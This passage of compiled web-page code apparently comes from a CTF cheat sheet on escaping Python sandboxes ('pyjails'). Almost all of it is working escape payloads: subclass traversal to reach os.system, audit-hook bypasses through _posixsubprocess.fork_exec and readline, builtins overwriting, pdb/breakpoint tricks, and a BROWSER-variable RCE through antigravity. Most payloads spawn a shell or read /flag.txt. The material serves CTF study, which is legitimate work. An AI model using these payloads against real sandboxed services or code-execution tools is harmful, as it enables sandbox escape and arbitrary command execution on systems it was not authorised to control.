punctuation">(</span>\u{1D634}<span class="token operator">+</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)</span>
<span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span>d<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3Fdoc\uFF3F_<span class="token punctuation">,</span>o<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span>h<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>s<span class="token operator">+</span>h<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fgetitem\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>o<span class="token operator">+</span>s<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fgetitem\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fpos\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fmro\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3Fsubclasses\uFF3F_<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code>`,gc,cs,Qa,yk,wc,ls,$g=`<code class="language-py"><span class="token keyword">import</span> sys<span class="token punctuation">,</span> os
sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token keyword">lambda</span> <span class="token operator">*</span><span class="token keyword">_</span><span class="token punctuation">:</span> x<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>_exit<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840</span></code>`,vc,us,Jg=`<code class="language-py"><span class="token comment"># https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5</span>
<span class="token comment"># https://github.com/python/cpython/issues/115322</span>
<span class="token keyword">import</span> readline
readline<span class="token punctuation">.</span>read_history_file<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>readline<span class="token punctuation">.</span>get_history_item<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> _posixsubprocess
errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># python 3.10, may differ in other versions</span>
_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> subprocess
errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># python 3.10, may differ in other versions</span>
subprocess<span class="token punctuation">.</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> multiprocessing<span class="token punctuation">.</span>util <span class="token comment"># underlying uses _posixsubprocess</span>
multiprocessing<span class="token punctuation">.</span>util<span class="token punctuation">.</span>spawnv_passfds<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># More techniques at https://github.com/Nambers/python-audit_hook_head_finder</span>
<span class="token comment"># + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc</span></code>`,Ec,ks,sp,gk,hc,rs,Kg='<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>',xc,is,Zg=`<code class="language-py"><span class="token comment"># walrus operator (>= python3.8)</span>
<span class="token punctuation">[</span>a<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># lambda</span>
<span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">)</span> <span class="token comment"># note that argument names aren't part of co_names</span>

<span class="token comment"># setattr</span>
<span class="token builtin">setattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>

<span class="token comment"># list comprehension</span>
<span class="token punctuation">[</span>cobj <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span></code>`,Cc,_s,np,wk,Lc,ds,Xg=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Tc,fs,Qg=`<code class="language-py"><span class="token comment"># eval</span>
<span class="token comment"># getattr</span>
<span class="token builtin">getattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
obj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">)</span>

<span class="token comment"># vars() and |=</span>
x <span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span> <span class="token comment"># add attributes of tuple into vars (concat) -> same as (x := x|vars(tuple))</span>
l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("__builtins__", "__getattribute__") - retrieve keys with underscore in name</span>
b <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># __builtins__ - could have shorten into l[0] if [] is available</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span> bu <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment"># &lt;module 'builtins' (built-in)> - could have shorten into x[b] here aswell</span>
l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("breakpoint") - retrieve "breakpoint"</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">;</span> brs <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># breakpoint</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>
br <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">,</span> brs<span class="token punctuation">)</span> <span class="token comment"># &lt;built-in function breakpoint></span>
br<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># exec</span>
<span class="token comment"># match</span>
<span class="token keyword">match</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">case</span> <span class="token builtin">object</span><span class="token punctuation">(</span>_\uFF3Fdoc\uFF3F_<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span>

<span class="token comment"># try...except</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
  <span class="token string">"&#123;0.__doc__.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># format string by itself can also be used to leak values</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
  a <span class="token operator">=</span> e<span class="token punctuation">.</span>obj
  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span>

<span class="token comment"># overwrite builtins</span>
__builtins__ <span class="token operator">=</span> sys
__builtins__ <span class="token operator">=</span> modules
__builtins__ <span class="token operator">=</span> os
system<span class="token punctuation">(</span><span class="token string">"cat /flag.txt"</span><span class="token punctuation">)</span></code>`,Ac,ms,ap,vk,Oc,bs,s2=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Fc,ys,n2=`<code class="language-py"><span class="token comment"># list comprehension (exec &amp; eval)</span>
<span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>obj<span class="token punctuation">[</span><span class="token string">"print(123)"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">eval</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># from builtin modules (exec &amp; eval) - &lt;class '_sitebuiltins.Quitter'>, &lt;class '_sitebuiltins._Printer'>, &lt;class '_sitebuiltins._Helper'></span>
<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>license<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> license<span class="token punctuation">.</span>_Printer__setup <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>copyright<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> copyright<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__str__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">+</span>license <span class="token keyword">for</span> license<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">-</span>quit <span class="token keyword">for</span> quit<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__neg__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"ls"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @hashkitten (exec)</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> system <span class="token keyword">as</span> __getattr__<span class="token punctuation">;</span> <span class="token keyword">from</span> __main__ <span class="token keyword">import</span> sh</code>`,Rc,gs,pp,Ek,Dc,ws,a2=`<code class="language-py"><span class="token comment"># exec</span>
<span class="token comment"># try...except</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    p
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> delete_me<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span>

<span class="token comment"># del</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">del</span> delete_me
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span></code>`,Ic,vs,tp,hk,jc,Es,op,xk,Nc,O,lt,F,Ck,Lk,b,ut,Tk,Ak,kt,Ok,Fk,rt,Rk,Dk,it,Ik,jk,_t,Nk,q,dt,ft,Pk,Hk,hs,mt,Uk,Mk,R,Bk,Pc,xs,ep,Sk,Hc,Cs,bt,D,qk,Uc,Ls,cp,zk,Mc,g,yt,Wk,Yk,lp,Gk,gt,Vk,$k,up,Jk,v,kp,wt,Kk,Zk,Xk,rp,vt,Qk,sr,nr,ip,Et,ar,pr,tr,E,ht,or,er,xt,cr,lr,Ct,ur,kr,Lt,rr,ir,_p,_r,I,dr,Bc,Ts,p2=`<code class="language-py"><span class="token comment"># load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># help()</span>
pdb <span class="token comment"># load pdb into imported modules</span>
app <span class="token comment"># the name of the main program in order to import / "rerun" the program</span>
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">155</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"pdb"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_trace<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># sys.modules["pdb"].set_trace()</span>

<span class="token comment"># overwrite BROWSER env for RCE through antigravity in help</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>1for <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"BROWSER"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'/bin/sh -c "cat /flag.txt" #%s'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
antigravity</code>`,Sc,As,dp,fr,qc,Os,t2=`<code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># need __import__</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;function __newobj__ at 0x7f0000000000> - need __import__ tho</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code>`,zc,Fs,fp,mr,Wc,j,mp,N,br,bp,Tt,At,yr,gr,yp,P,wr,gp,Ot,Ft,vr,Yc,Rs,wp,Er,Gc,f,H,Rt,hr,xr,Dt,Cr,Lr,vp,Ep,It,Tr,Ar,Or,hp,jt,Fr,z,Nt,Pt,Rr,Dr,Ht,Ut,Ir,jr,xp,Mt,Nr,C,Bt,St,Pr,Hr,qt,zt,Ur,Mr,Wt,Yt,Br,Sr,Cp,Gt,qr,L,Vt,$t,zr,Wr,Jt,Kt,Yr,Gr,Zt,Xt,Vr,$r,Lp,Qt,Jr,Tp,so,no,Kr,Zr,Ap,ao,Xr,T,po,to,Qr,si,oo,eo,ni,ai,co,lo,pi,ti,Ds,uo,oi,ei,W,Op,ko,ci,Fp,ro,io,li,ui,Rp,_o,ki,Dp,fo,mo,ri,Vc,Is,Ip,ii,$c,js,jp,_i,Jc,Ns,bo,yo,di,Kc,Ps,o2=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code <span class="token operator">:=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"jail> "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token keyword">and</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fullmatch<span class="token punctuation">(</span><span class="token string">r'([^()]|())*'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">":("</span><span class="token punctuation">)</span></code>`,Zc,Hs,go,wo,fi,Xc,Us,e2=`<code class="language-py"><span class="token comment"># @Ark - rerun w/ help while adding pdb to loaded sys modules</span>
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
pdb
jail
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"pdb"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_trace<span class="token punctuation">(</span><span class="token punctuation">)</span>
